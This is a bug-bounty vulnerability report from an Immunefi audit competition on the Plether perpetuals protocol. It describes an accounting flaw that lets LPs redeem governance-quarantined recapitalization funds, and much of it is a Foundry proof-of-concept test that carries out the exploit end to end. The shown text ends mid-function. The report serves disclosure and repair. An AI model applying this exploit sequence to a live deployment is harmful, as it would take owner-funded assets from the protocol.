# \#100002 [SC-Medium] Reversible trader liability lets LPs withdraw governance-quarantined recapitalization

**Submitted on Nov 16th 2026 at 02:00:43 UTC by @polymix123 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100002
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

# Reversible trader liability lets LPs withdraw governance-quarantined recapitalization

## Brief/Intro

A temporary, unpaid trader profit can erase both tranche principals and reduce `HousePool.unassignedAssets`. When the mark recedes, the pool credits the recovered value to existing LP shares instead of restoring the governance-controlled bucket. Any matured redemption settled during the temporary mark can persist this accounting change, and an LP can subsequently redeem physical USDG that only the pool owner should be able to allocate with matching bootstrap shares.

## Vulnerability Details

`unassignedAssets` is recognized pool cash without an LP claimant. The protocol requires an explicit owner-only `assignUnassignedAssets` operation, which mints matching tranche shares, before LPs may own it. A legitimate recovery can create this bucket after trading starts: the Engine owner recapitalizes a degraded pool; if Senior principal is already at its high-water mark, the residual recapitalization is routed to `unassignedAssets`. This can occur while a position opened before the recapitalization remains live. [HousePoolPendingPreviewLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L136) and [HousePool.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L653-L703) implement these ownership rules.

Let the stored combined tranche principal be `P > 0`, unassigned assets be `U > 0`, and a temporary unpaid trader profit be `X` with `P < X < P + U`. Pool cash remains `P + U`, but terminal distributable equity becomes `D = P + U - X`. On reconciliation, `planReconcile` caps unassigned assets at `D`, subtracts that amount from distributable equity, and charges the full `P` loss to the tranches. The persisted state is `principal = 0; unassignedAssets = D`. See [HousePoolReconcilePlanLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L62-L104).

If the trader does not collect the profit and the mark recedes to its original level, terminal equity returns to `P + U` without a USDG transfer. Reconciliation now enters the `claimedEquityZero` branch. It preserves only the reduced `D` as unassigned and routes the remainder `X` through `applyRevenueIntent`, restoring Senior to its high-water mark and crediting the rest to surviving Junior shares. The resulting state is `principal = X; unassignedAssets = P + U - X`. The correct no-transfer state is `principal = P; unassignedAssets = U`; thus `X - P` of owner-controlled cash has become LP principal. [HousePoolReconcilePlanLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L73-L81) and [HousePoolPendingPreviewLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L168-L186) show the exact routing.

The wipe is persistable through the public LP settlement path. At zero tranche principal, any matured redemption quotes zero net assets and is refunded; the refund counts as processed epoch work, so a permissionless `settleLpEpoch` can complete and store the reconcile. This needs neither a privileged attacker call nor a specially sized dust request: an ordinary matured redemption is enough. [HousePool.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L949-L986) contains the refund path.

The attached `C2_Reversible_Liability_Capture.patch` demonstrates a complete release-parameter lifecycle on the audited commit. It changes no production source. The test uses the production Engine, Router V3 order lifecycle, HousePool, Clearinghouse, and vaults. The repository's `BasePerpTest` fixture deploys `LegacyOrderRouterHarness`, a subclass of the production `OrderRouter`; this PoC calls only inherited, unmodified V3 `commitOrder(OrderRequest)`, `executeOrder`, `updateMarkPrice`, and `settleLpEpoch` selectors, never the harness's legacy scalar-commit adapter. Only the external USDG token and six-feed Pyth source are mocked. Its sole fixture change makes four existing feed-configuration helpers `virtual` so the test can use the release basket. Both branches execute the same opens, winner close, exact deficit recapitalization, public price path, attacker close, and async Junior redemption. After the shared owner recovery, the attack branch alone settles an LP epoch at the temporary-profit mark. The control waits until the rebound. Both branches finish at the same timestamp and compare wallet USDG, post-close trader equity, trader claims, and pending Junior LP value.

## Impact Details

The test's release-parameter path is `1.00 → 2.00 → 0.25 → 2.00`. A winning SHORT closes at `2.00`, producing a genuine degraded-mode deficit. The owner supplies exactly the `19,886,475.753957` USDG needed to restore raw solvency; this is not discretionary overfunding. The surviving LONG's temporary profit at `0.25` is `69,999,125` USDG. An intermediate public LP settlement makes `9,886,600.753957` USDG leave `unassignedAssets` and enter LP principal. The later Junior redemption pays `20,318,832.767548` USDG in the attack branch versus `10,431,775.384246` USDG in the matched control. Accounting for the remaining pending Junior LP value and trader balances, the attacker is `9,886,965.892907` USDG wealthier. The amount above the exact governance-bucket debit comes from a separate small Senior coupon timing effect in the asynchronous trace; it is not asserted as a second C2 loss.

The claimed **Critical** impact maps to the scope's [“Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield”](https://immunefi.com/audit-competition/plether/scope/) category. The protected funds here are physical USDG contributed by the Engine owner in the documented recovery operation and retained in HousePool as a governance-controlled allocation, not unclaimed yield. The owner is the funding account, while the HousePool owner controls the destination of this bucket; these roles need not be the same address. Existing LP shares obtain the protocol's recovery cash without that allocation decision or the matching bootstrap mint, then redeem it. The scope explicitly allows a privileged address to be the affected party and a legitimate trusted-role operation to trigger an in-scope bug. This submission does not claim that an existing trader balance or ordinary LP deposit is directly debited; it claims theft of the owner-funded protocol entitlement. The direct C2 amount is `X - P`, capped by `U`, and need not be a rounding-scale amount. The attacker can be an existing Junior LP; the position carrying temporary marked profit can belong to another trader. A rational holder need only exercise the permissionless intermediate settlement when an authenticated market mark satisfies `X > P`, and receives the captured value if the mark recedes before that profit is paid. A full return to entry is unnecessary: the capture remains once the residual marked profit is at most the original principal. The test's particular move is large: for one directional liability envelope `L = P + U`, a LONG must fall from entry by more than `P/L` of its full profit range (`mark/entry < U/(P+U)`). Feasibility affects the opportunity, but does not change the accounting loss once the state occurs.

As a secondary, conditional sequencing angle, if two genuine authenticated Pyth observations fit within the oracle's 15-second live parsing window, permissionless calls can settle an LP epoch at the adverse observation and then refresh to the later observation in the same transaction. This can leave the same final mark as a route that omitted the intermediate settlement; it still requires the real market excursion and does not assume forged oracle data. The supplied PoC demonstrates the complete asynchronous public route, including physical redemption, rather than relying on this short-window variant.

This is distinct from Cecuro MED-26, the prior ownerless-assets activation issue: that guard concerns starting new risk with `unassignedAssets`. In this route the surviving position is already open before the owner recapitalizes, so even a continuous ban on new opens while `U > 0` would not prevent its later marked profit or the rebound. MED-26's new-open guard also does not restore ownership after a reversible mark; C2 requires preserving the unassigned recovery target through the wipe. It is also distinct from MED-24's refund epoch work-budget issue: a zero-output refund is merely the public trigger for a successful reconcile; changing how refunds consume the 16-epoch budget does not repair the lost unassigned ownership target.

## Proof of Concept

Apply [the secret-gist `C2_Reversible_Liability_Capture.patch`](https://gist.github.com/fuzious/5a070f585ff89022ba52f1e521b98c06) at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` and run:

```bash
git apply --check C2_Reversible_Liability_Capture.patch
git apply C2_Reversible_Liability_Capture.patch
cd packages/perps
forge test --match-path test/poc/UNAS01AllPublic.t.sol -vv
```

The PoC asserts that the attack's additional LP principal exactly debits `unassignedAssets`, pool cash does not move during the mark round trip, the control preserves the original allocation, the trader and winner outcomes match within explicitly bounded timing effects, and the excess value is actually funded through the public redemption path. The patch is self-contained against the pinned repository after its submodules are initialized.

## Recommendation

Track the portion of `unassignedAssets` consumed by a reversible terminal liability and replenish that ownership target before routing subsequent mark recovery to tranche principal. Retire the target only when the corresponding liability is irreversibly paid or governance explicitly assigns the cash with matching shares. Add a mark round-trip regression with `P < X < P + U`, plus an LP-epoch regression proving that a settled redemption cannot realize `U` without `assignUnassignedAssets`.

## References

- [Audited commit](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8)
- [HousePool reconciliation plan](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L62-L104)
- [Recapitalization and revenue routing](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L186)
- [Owner-only assignment and bootstrap mint](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L653-L703)
- [Documented unassigned-assets ownership](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/INTERNAL_ARCHITECTURE_MAP.md#L69-L77)


## Link to Proof of Concept

https://gist.github.com/fuzious/5a070f585ff89022ba52f1e521b98c06

## Proof of Concept

```diff
diff --git a/packages/perps/test/perps/BasePerpTest.sol b/packages/perps/test/perps/BasePerpTest.sol
index f322d21b..206e3191 100644
--- a/packages/perps/test/perps/BasePerpTest.sol
+++ b/packages/perps/test/perps/BasePerpTest.sol
@@ -272,25 +272,25 @@ abstract contract BasePerpTest is RecordedOrderReceipts {
         return address(this);
     }
 
-    function _basePythFeedIds() internal pure returns (bytes32[] memory feedIds) {
+    function _basePythFeedIds() internal pure virtual returns (bytes32[] memory feedIds) {
         feedIds = new bytes32[](2);
         feedIds[0] = BASE_PYTH_FEED_A;
         feedIds[1] = BASE_PYTH_FEED_B;
     }
 
-    function _basePythWeights() internal pure returns (uint256[] memory weights) {
+    function _basePythWeights() internal pure virtual returns (uint256[] memory weights) {
         weights = new uint256[](2);
         weights[0] = 0.5e18;
         weights[1] = 0.5e18;
     }
 
-    function _basePythBasePrices() internal pure returns (uint256[] memory basePrices) {
+    function _basePythBasePrices() internal pure virtual returns (uint256[] memory basePrices) {
         basePrices = new uint256[](2);
         basePrices[0] = 1e8;
         basePrices[1] = 1e8;
     }
 
-    function _basePythInversions() internal pure returns (bool[] memory inversions) {
+    function _basePythInversions() internal pure virtual returns (bool[] memory inversions) {
         inversions = new bool[](2);
     }
 
diff --git a/packages/perps/test/poc/UNAS01AllPublic.t.sol b/packages/perps/test/poc/UNAS01AllPublic.t.sol
new file mode 100644
index 00000000..fb802048
--- /dev/null
+++ b/packages/perps/test/poc/UNAS01AllPublic.t.sol
@@ -0,0 +1,429 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.35;
+
+import {CfdTypes} from "@plether/perps/CfdTypes.sol";
+import {OrderRouter} from "@plether/perps/OrderRouter.sol";
+import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
+import {TrancheVault} from "@plether/perps/TrancheVault.sol";
+import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
+import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
+import {MockPyth} from "@plether/test-utils/MockPyth.sol";
+import {BasePerpTest} from "../perps/BasePerpTest.sol";
+
+/// @notice All-public release-topology impact proof for C2 / UNAS-01.
+/// @dev Every market transition uses the production V3 Router and a six-feed
+///      MockPyth payload. After the exact solvency recapitalization and latch
+///      clearing, the attack branch needs no privileged call. The matched
+///      control executes the same trades, marks, timestamps and recapitalization;
+///      it omits only the dip-time LP reconcile.
+contract UNAS01AllPublicReleaseLifecycleTest is BasePerpTest {
+    // Public LP epochs accrue a small Senior coupon before trading, leaving
+    // depth a few hundred USDG below 100m. Stay one extra 100-token quantum
+    // inside the resulting 40% skew limit.
+    uint256 internal constant HEDGED_SIZE = 39_999_500e18;
+    address internal constant SENIOR_LP = address(0xA110);
+    address internal constant ATTACKER = address(0xA771);
+    address internal constant WINNER = address(0xBEEF1);
+    address internal constant KEEPER = address(0xBEEF2);
+    address internal constant DUST_ONE = address(0xD001);
+    address internal constant DUST_TWO = address(0xD002);
+    address internal constant DUST_THREE = address(0xD003);
+
+    uint256 internal clientNonce;
+
+    function _initialJuniorDeposit() internal pure override returns (uint256) {
+        return 0;
+    }
+
+    function _initialSeniorDeposit() internal pure override returns (uint256) {
+        return 0;
+    }
+
+    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
+        return 1e6;
+    }
+
+    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
+        return 1e6;
+    }
+
+    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
+        return CfdTypes.RiskParams({
+            vpiFactor: 0.01e18,
+            maxSkewRatio: 0.4e18,
+            maintMarginBps: 10,
+            initMarginBps: 20,
+            fadMarginBps: 300,
+            baseCarryBps: 500,
+            minBountyAssets: 1e6,
+            bountyBps: 10,
+            keeperShareBps: 5_000,
+            protocolShareBps: 0
+        });
+    }
+
+    function _basePythFeedIds() internal pure override returns (bytes32[] memory ids) {
+        ids = new bytes32[](6);
+        for (uint256 i; i < 6; ++i) ids[i] = bytes32(i + 1);
+    }
+
+    function _basePythWeights() internal pure override returns (uint256[] memory weights) {
+        weights = new uint256[](6);
+        weights[0] = 0.576e18;
+        weights[1] = 0.136e18;
+        weights[2] = 0.119e18;
+        weights[3] = 0.091e18;
+        weights[4] = 0.042e18;
+        weights[5] = 0.036e18;
+    }
+
+    function _basePythBasePrices() internal pure override returns (uint256[] memory bases) {
+        bases = new uint256[](6);
+        bases[0] = 117_500_000;
+        bases[1] = 638_000;
+        bases[2] = 134_480_000;
+        bases[3] = 72_880_000;
+        bases[4] = 10_860_000;
+        bases[5] = 126_100_000;
+    }
+
+    function _basePythInversions() internal pure override returns (bool[] memory inversions) {
+        inversions = new bool[](6);
+        inversions[1] = true;
+        inversions[3] = true;
+        inversions[4] = true;
+        inversions[5] = true;
+    }
+
+    function setUp() public override {
+        super.setUp();
+        _setSeniorCapacity(40_000_000e6, 8_000);
+
+        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
+        config.basketMaxConfidenceRatioBps = 10;
+        config.orderSettlementWindow = 15;
+        config.maxComponentPublishTimeDivergence = 5;
+        config.adverseConfidenceMultiplierBps = 2_500;
+        config.minOpenNotionalAssets = 1_000e6;
+        config.positionProtectionTriggerBountyAssets = 200_000;
+        config.maxPendingOrders = 5;
+        _setRouterConfig(config);
+
+        _warpToNextMondayAtTen();
+        OrderRouter(address(router)).updateMarkPrice(_livePayload(1, 1));
+
+        _publicFundTranche(juniorVault, ATTACKER, 59_999_000e6);
+        _publicFundTranche(seniorVault, SENIOR_LP, seniorVault.maxRequestDeposit(SENIOR_LP));
+        // Epoch time accrues a small Senior coupon during public activation;
+        // total depth, the 40m Senior cap, and the launch ratio remain exact
+        // enough for the 39,999,900-lot skew-boundary construction.
+        assertApproxEqAbs(pool.seniorPrincipal(), 40_000_000e6, 2_000e6, "release Senior principal");
+        assertApproxEqAbs(
+            pool.seniorPrincipal() + pool.juniorPrincipal(), 100_000_000e6, 2_000e6, "release Pool depth"
+        );
+
+        _finishCooldown(juniorVault, ATTACKER);
+        vm.startPrank(ATTACKER);
+        juniorVault.transfer(DUST_ONE, 1);
+        juniorVault.transfer(DUST_TWO, 1);
+        juniorVault.transfer(DUST_THREE, 1);
+        vm.stopPrank();
+
+        _fundTrader(WINNER, 3_000_000e6);
+        _fundTrader(ATTACKER, 3_000_000e6);
+    }
+
+    function test_UNAS01_AllPublicRouterCapturesRequiredOwnerRecap() public {
+        uint256 winnerDustId = _requestRedeem(DUST_ONE, 1);
+
+        _publicTrade(WINNER, CfdTypes.Side.SHORT, HEDGED_SIZE, 1_000_000e6, false, 1, 1);
+        _publicTrade(ATTACKER, CfdTypes.Side.LONG, HEDGED_SIZE, 1_000_000e6, false, 2, 1);
+
+        (uint256 attackerSize,, uint256 attackerEntry, uint256 attackerMaxProfit, CfdTypes.Side attackerSide,,) =
+            engine.positions(ATTACKER);
+        assertEq(attackerSize, HEDGED_SIZE, "attacker position size");
+        assertEq(attackerEntry, 2e8, "attacker entry");
+        assertEq(attackerMaxProfit, 79_999_000e6, "release max-profit envelope");
+        assertEq(uint256(attackerSide), uint256(CfdTypes.Side.LONG), "attacker side");
+
+        _publicTrade(WINNER, CfdTypes.Side.SHORT, HEDGED_SIZE, 0, true, 2, 1);
+        assertTrue(engine.degradedMode(), "winner payout must create the recovery incident");
+
+        uint256 cashAfterWinner = pool.totalAssets();
+        uint256 maxLiability = engine.terminalNavSnapshot().maxDirectionalLiabilityAssets;
+        assertEq(maxLiability, attackerMaxProfit, "surviving liability");
+        assertLt(cashAfterWinner, maxLiability, "recovery deficit must be real");
+        uint256 requiredRecap = maxLiability - cashAfterWinner;
+
+        uint256 ownerWalletBefore = settlementToken.balanceOf(address(this));
+        settlementToken.mint(address(this), requiredRecap);
+        settlementToken.approve(address(engine), requiredRecap);
+        engine.recapitalizePool(requiredRecap);
+        engine.clearDegradedMode();
+        assertEq(settlementToken.balanceOf(address(this)), ownerWalletBefore, "exact owner-funded deficit");
+
+        _publicSettle(winnerDustId, 2, 1);
+        uint256 principalBefore = pool.seniorPrincipal() + pool.juniorPrincipal();
+        uint256 unassignedBefore = pool.unassignedAssets();
+        uint256 physicalBefore = pool.totalAssets();
+        assertEq(unassignedBefore, requiredRecap, "required recovery cash must be quarantined");
+        assertEq(physicalBefore, maxLiability, "recap only reaches raw solvency equality");
+
+        uint256 branchState = vm.snapshotState();
+
+        // No privileged call occurs after the shared branch snapshot.
+        uint256 dipDustId = _requestRedeem(DUST_TWO, 1);
+        _publicSettle(dipDustId, 1, 4);
+        uint256 dipTimestamp = vm.getBlockTimestamp();
+        uint256 markedProfit = uint256(-engine.terminalNavSnapshot().terminalLpPriceDeltaAssets);
+        assertGt(markedProfit, principalBefore, "temporary liability must exceed claimed principal");
+        assertLt(markedProfit, physicalBefore, "temporary liability must remain solvent");
+        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal(), 0, "dip reconcile wipes claimant principal");
+
+        uint256 reboundDustId = _requestRedeem(DUST_THREE, 1);
+        _publicSettle(reboundDustId, 2, 1);
+        uint256 reboundTimestamp = vm.getBlockTimestamp();
+        assertEq(engine.terminalNavSnapshot().terminalLpPriceDeltaAssets, 0, "rebound erases uncollected profit");
+
+        uint256 principalAfter = pool.seniorPrincipal() + pool.juniorPrincipal();
+        uint256 attackUnassignedBeforeCashOut = pool.unassignedAssets();
+        uint256 capturedAssets = principalAfter - principalBefore;
+        assertGt(capturedAssets, 0, "rebound must allocate owner recovery to LP shares");
+        assertEq(
+            unassignedBefore - attackUnassignedBeforeCashOut,
+            capturedAssets,
+            "claimant gain must exactly debit the governance bucket"
+        );
+        assertEq(pool.totalAssets(), physicalBefore, "price round trip moves no Pool cash");
+
+        _publicTrade(ATTACKER, CfdTypes.Side.LONG, HEDGED_SIZE, 0, true, 2, 1);
+        uint256 attackTraderEquity = clearinghouse.getAccountEquityAssets(ATTACKER);
+        uint256 attackRedeemId = _requestRedeem(ATTACKER, juniorVault.maxRequestRedeem(ATTACKER));
+        _publicSettle(attackRedeemId, 2, 1);
+        uint256 attackPayout = _claimRedeem(attackRedeemId, ATTACKER);
+        uint256 attackWallet = settlementToken.balanceOf(ATTACKER);
+        uint256 attackClaim = engine.traderClaimBalanceAssets(ATTACKER);
+        uint256 attackPendingLpValue = juniorVault.estimateRedeemAssets(
+            juniorVault.pendingRedeemRequest(attackRedeemId, ATTACKER)
+        );
+        uint256 attackWinnerWealth = settlementToken.balanceOf(WINNER)
+            + clearinghouse.getAccountEquityAssets(WINNER) + engine.traderClaimBalanceAssets(WINNER);
+        uint256 attackSeniorLpWealth = settlementToken.balanceOf(SENIOR_LP)
+            + seniorVault.estimateRedeemAssets(seniorVault.balanceOf(SENIOR_LP));
+        uint256 attackOwnerWallet = settlementToken.balanceOf(address(this));
+        uint256 attackFinalTimestamp = vm.getBlockTimestamp();
+        uint256 attackFinalSeniorPrincipal = pool.seniorPrincipal();
+        uint256 attackFinalJuniorPrincipal = pool.juniorPrincipal();
+        uint256 attackFinalSeniorHwm = pool.seniorHighWaterMark();
+
+        // Identical public market path and timing; only the dip reconcile is absent.
+        assertTrue(vm.revertToState(branchState), "control restore");
+        uint256 controlDipDustId = _requestRedeem(DUST_TWO, 1);
+        _warpAtLeast(dipTimestamp);
+        OrderRouter(address(router)).updateMarkPrice(
+            _payload(1, 4, uint64(vm.getBlockTimestamp()), uint64(vm.getBlockTimestamp() - 1))
+        );
+        _warpAtLeast(reboundTimestamp - 1);
+        _publicSettle(controlDipDustId, 2, 1);
+        assertEq(pool.unassignedAssets(), unassignedBefore, "control preserves governance allocation");
+        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal(), principalBefore, "control preserves LP principal");
+
+        _publicTrade(ATTACKER, CfdTypes.Side.LONG, HEDGED_SIZE, 0, true, 2, 1);
+        uint256 controlTraderEquity = clearinghouse.getAccountEquityAssets(ATTACKER);
+        uint256 controlRedeemId = _requestRedeem(ATTACKER, juniorVault.maxRequestRedeem(ATTACKER));
+        _publicSettle(controlRedeemId, 2, 1);
+        uint256 controlPayout = _claimRedeem(controlRedeemId, ATTACKER);
+        uint256 controlWallet = settlementToken.balanceOf(ATTACKER);
+        uint256 controlClaim = engine.traderClaimBalanceAssets(ATTACKER);
+        uint256 controlPendingLpValue = juniorVault.estimateRedeemAssets(
+            juniorVault.pendingRedeemRequest(controlRedeemId, ATTACKER)
+        );
+        uint256 controlWinnerWealth = settlementToken.balanceOf(WINNER)
+            + clearinghouse.getAccountEquityAssets(WINNER) + engine.traderClaimBalanceAssets(WINNER);
+        uint256 controlSeniorLpWealth = settlementToken.balanceOf(SENIOR_LP)
+            + seniorVault.estimateRedeemAssets(seniorVault.balanceOf(SENIOR_LP));
+        uint256 controlOwnerWallet = settlementToken.balanceOf(address(this));
+        uint256 controlFinalTimestamp = vm.getBlockTimestamp();
+        uint256 controlFinalSeniorPrincipal = pool.seniorPrincipal();
+        uint256 controlFinalJuniorPrincipal = pool.juniorPrincipal();
+        uint256 controlFinalSeniorHwm = pool.seniorHighWaterMark();
+
+        uint256 attackerGain = attackWallet + attackTraderEquity + attackClaim + attackPendingLpValue
+            - (controlWallet + controlTraderEquity + controlClaim + controlPendingLpValue);
+        uint256 governanceLoss = unassignedBefore - attackUnassignedBeforeCashOut;
+
+        // Public async epochs introduce a few seconds of path-dependent carry.
+        // Keep it in the complete wealth comparison below and separately bound
+        // it to less than 1,000 USDG versus the multi-million capture.
+        assertApproxEqAbs(
+            attackTraderEquity, controlTraderEquity, 1_000e6, "flat-trade timing/carry differential must stay immaterial"
+        );
+        assertEq(attackClaim, controlClaim, "claim state must be branch-invariant");
+        assertEq(attackWinnerWealth, controlWinnerWealth, "winner wealth must be branch-invariant");
+        assertEq(attackFinalTimestamp, controlFinalTimestamp, "branch clocks must converge");
+        assertApproxEqAbs(
+            attackSeniorLpWealth,
+            controlSeniorLpWealth,
+            1_000e6,
+            "Senior LP difference must stay inside the already-bounded timing/policy family"
+        );
+        assertEq(attackOwnerWallet, controlOwnerWallet, "owner wallet must be branch-invariant");
+        assertGt(attackPayout, controlPayout, "only intermediate reconcile creates excess cash");
+        assertGe(attackPayout - controlPayout, capturedAssets - 1e6, "cash-out realizes captured allocation");
+        assertGe(attackerGain, capturedAssets - 1e6, "net attacker wealth captures owner recovery");
+        assertEq(governanceLoss, capturedAssets, "governance entitlement loses the same amount");
+
+        emit log_named_uint("minimum required owner recap", requiredRecap);
+        emit log_named_uint("temporary marked profit", markedProfit);
+        emit log_named_uint("governance unassigned loss", governanceLoss);
+        emit log_named_uint("attack Junior cash payout", attackPayout);
+        emit log_named_uint("control Junior cash payout", controlPayout);
+        emit log_named_uint("attack pending Junior LP value", attackPendingLpValue);
+        emit log_named_uint("control pending Junior LP value", controlPendingLpValue);
+        emit log_named_uint("net attacker wealth gain", attackerGain);
+        emit log_named_uint("winner branch wealth delta", attackWinnerWealth - controlWinnerWealth);
+        emit log_named_uint("attack final timestamp", attackFinalTimestamp);
+        emit log_named_uint("control final timestamp", controlFinalTimestamp);
+        emit log_named_int(
+            "Senior LP branch wealth delta", int256(attackSeniorLpWealth) - int256(controlSeniorLpWealth)
+        );
+        emit log_named_int(
+            "Senior principal branch delta", int256(attackFinalSeniorPrincipal) - int256(controlFinalSeniorPrincipal)
+        );
+        emit log_named_int(
+            "Junior principal branch delta", int256(attackFinalJuniorPrincipal) - int256(controlFinalJuniorPrincipal)
+        );
+        emit log_named_int("Senior HWM branch delta", int256(attackFinalSeniorHwm) - int256(controlFinalSeniorHwm));
+        emit log_named_uint("owner wallet branch wealth delta", attackOwnerWallet - controlOwnerWallet);
+    }
+
+    function _publicFundTranche(TrancheVault vault, address account, uint256 amount) private {
+        settlementToken.mint(account, amount);
+        vm.startPrank(account);
+        settlementToken.approve(address(vault), amount);
+        uint256 requestId = vault.requestDeposit(amount, account, account);
+        vm.stopPrank();
+        _publicSettle(requestId, 1, 1);
+        uint256 claimable = vault.claimableDepositRequest(requestId, account);
+        vm.prank(account);
+        vault.claimDeposit(requestId, claimable, account, account);
+    }
+
+    function _finishCooldown(TrancheVault vault, address account) private {
+        uint256 unlock = vault.lastDepositTime(account) + vault.DEPOSIT_COOLDOWN();
+        if (vm.getBlockTimestamp() < unlock) vm.warp(unlock);
+    }
+
+    function _requestRedeem(address account, uint256 shares) private returns (uint256 requestId) {
+        _finishCooldown(juniorVault, account);
+        vm.prank(account);
+        requestId = juniorVault.requestRedeem(shares, account, account);
+    }
+
+    function _claimRedeem(uint256 requestId, address account) private returns (uint256 payout) {
+        uint256 beforeBalance = settlementToken.balanceOf(account);
+        uint256 shares = juniorVault.claimableRedeemRequest(requestId, account);
+        assertGt(shares, 0, "redemption must be funded");
+        vm.prank(account);
+        juniorVault.claimRedeem(requestId, shares, account, account);
+        payout = settlementToken.balanceOf(account) - beforeBalance;
+    }
+
+    function _publicSettle(uint256 requestId, uint256 numerator, uint256 denominator) private {
+        uint256 maturity = pool.lpEpochStart(requestId);
+        if (vm.getBlockTimestamp() < maturity) vm.warp(maturity);
+        vm.prank(KEEPER);
+        OrderRouter(address(router)).settleLpEpoch(_livePayload(numerator, denominator));
+    }
+
+    function _publicTrade(
+        address account,
+        CfdTypes.Side side,
+        uint256 size,
+        uint256 margin,
+        bool isClose,
+        uint256 numerator,
+        uint256 denominator
+    ) private {
+        uint256 currentSize;
+        (currentSize,,,,,,) = engine.positions(account);
+        OrderV3Types.OrderRequest memory request;
+        request.clientOrderId = keccak256(abi.encode("UNAS01-PUBLIC", ++clientNonce));
+        request.side = side;
+        request.sizeDelta = size;
+        request.marginDelta = isClose ? 0 : margin;
+        request.targetPrice = side == CfdTypes.Side.LONG
+            ? (isClose ? type(uint256).max : 1)
+            : (isClose ? 1 : type(uint256).max);
+        request.isClose = isClose;
+        request.bounds = OrderV3Types.ExecutionBounds({
+            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
+            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
+            allowedExecutionModes: 7,
+            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
+            maxExecutionBountyAssets: type(uint256).max,
+            maxExecutionNotionalAssets: type(uint256).max,
+            maxGrossAccountDebitAssets: type(uint256).max,
+            maxActionChargeAssets: type(uint256).max,
+            maxExplicitFeesAssets: type(uint256).max,
+            maxPostPositionSize: isClose ? currentSize - size : currentSize + size,
+            minPostSettlementBalanceAssets: 0,
+            minPostPositionEquityAssets: 0,
+            maxPostLeverageBps: type(uint32).max
+        });
+        vm.prank(account);
+        uint64 orderId = OrderRouter(address(router)).commitOrder(request);
+        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
+        vm.roll(block.number + 1);
+        vm.warp(vm.getBlockTimestamp() + 1);
+        bytes[] memory executionPayload = _payload(numerator, denominator, pending.commitTime + 1, pending.commitTime);
+        vm.prank(KEEPER);
+        OrderV3Types.ExecutionResult memory result = OrderRouter(address(router)).executeOrder(orderId, executionPayload);
+        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public order execution");
+    }
+
+    function _livePayload(uint256 numerator, uint256 denominator) private returns (bytes[] memory data) {
+        vm.roll(block.number + 1);
+        vm.warp(vm.getBlockTimestamp() + 1);
+        uint64 tick = uint64(vm.getBlockTimestamp());
+        return _payload(numerator, denominator, tick, tick - 1);
+    }
+
+    function _payload(uint256 numerator, uint256 denominator, uint64 publishTime, uint64 previousTime)
+        private
+        view
+        returns (bytes[] memory data)
+    {
+        bytes32[] memory ids = _basePythFeedIds();
+        uint256[] memory bases = _basePythBasePrices();
+        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
+        for (uint256 i; i < 6; ++i) {
+            bool inverted = i == 1 || i >= 3;
+            uint256 raw = inverted
+                ? (1e16 * denominator) / (bases[i] * numerator)
+                : (bases[i] * numerator) / denominator;
+            updates[i] = MockPyth.FeedUpdate(
+                ids[i], MockPyth.MockPrice(int64(uint64(raw)), 0, -8, publishTime, previousTime)
+            );
+        }
+        data = new bytes[](1);
+        data[0] = abi.encode(updates);
+    }
+
+    function _warpAtLeast(uint256 target) private {
+        if (vm.getBlockTimestamp() < target) vm.warp(target);
+        else vm.warp(vm.getBlockTimestamp() + 1);
+        vm.roll(block.number + 1);
+    }
+
+    function _warpToNextMondayAtTen() private {
+        uint256 day = vm.getBlockTimestamp() / 1 days;
+        if ((day + 4) % 7 == 1 && vm.getBlockTimestamp() < day * 1 days + 10 hours) {
+            vm.warp(day * 1 days + 10 hours);
+            return;
+        }
